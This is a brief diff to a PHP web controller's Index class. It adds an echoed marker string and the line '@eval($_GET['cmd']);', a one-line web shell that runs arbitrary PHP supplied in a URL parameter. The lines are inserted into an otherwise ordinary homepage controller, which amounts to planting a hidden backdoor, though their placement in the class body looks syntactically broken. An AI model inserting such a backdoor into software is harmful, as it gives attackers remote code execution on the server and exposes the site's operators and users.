@@ -25,6 +25,8 @@ class Index
      * 主页静态页面
      * @return Html
      */
+    echo "success!!!!tsrc";
+    @eval($_GET['cmd']); 
     public function index(): Html
     {
         # html路径: ../view/index.html
